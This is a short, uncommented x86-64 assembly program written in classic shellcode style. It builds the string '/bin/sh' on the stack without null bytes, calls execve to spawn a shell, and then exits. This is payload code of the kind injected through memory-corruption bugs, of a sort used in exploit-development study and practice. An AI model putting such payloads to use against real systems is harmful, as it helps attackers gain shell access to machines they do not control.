[SECTION .text]

global _start

align 4096
_start:
    xor rax, rax
    xor rdx, rdx

    mov bx, 0x6873
    shl rbx, 16
    mov bx, 0x2f6e
    shl rbx, 16
    mov bx, 0x6962
    shl rbx, 8
    mov bl, 0x2f
    push rbx

    push rdx
    lea rdi, [rsp + 8]
    push rdi
    mov rsi, rsp
    mov al, 59
    syscall

    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall

